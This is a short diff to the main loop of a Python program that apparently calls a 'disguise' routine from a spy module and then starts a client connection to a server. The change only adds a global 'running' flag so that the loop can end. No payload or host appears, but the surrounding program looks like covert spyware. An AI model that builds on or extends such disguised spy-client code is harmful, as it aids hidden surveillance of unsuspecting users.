@@ -15,12 +15,14 @@ protocol = ""
 interface = ""
 
 def main(argv):
+	global running 
+	
 	checkArgs(argv)
 	spyFunctions.disguise()
 	sendFunctions.startClient(server, protocol, interface)
 	
 	try: 
-		while(True):
+		while(running):
 			pass
 	except (KeyboardInterrupt, SystemExit):
 		running = False
